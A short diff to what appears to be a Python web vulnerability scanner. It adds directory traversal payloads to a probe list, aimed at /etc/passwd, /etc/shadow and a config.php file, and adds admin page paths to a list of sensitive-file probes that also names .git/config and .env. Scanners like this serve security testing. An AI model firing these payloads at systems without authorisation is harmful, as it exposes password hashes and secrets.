@@ -380,6 +380,9 @@ def check_xss(domain):
 # 6. Directory Traversal Check
 def check_directory_traversal(domain):
     traversal_payloads = [
+        "/../../../etc/passwd",
+        "/../../../etc/shadow",
+        "/../../../var/www/html/config.php",
         "/../../../../etc/passwd",  # Unix/Linux password file
         "/..%2F..%2F..%2F..%2Fetc%2Fpasswd",  # URL-encoded version for Unix/Linux password file
         "/..%5C..%5C..%5C..%5Cetc%5Cpasswd",
@@ -417,6 +420,8 @@ def check_directory_traversal(domain):
 # 7. Sensitive File Exposure Check
 def check_sensitive_files(domain):
     sensitive_files = [
+        "/admin.php",
+        "/user/admin.php",
         "/robots.txt",
         "/.git/config",
         "/.env",
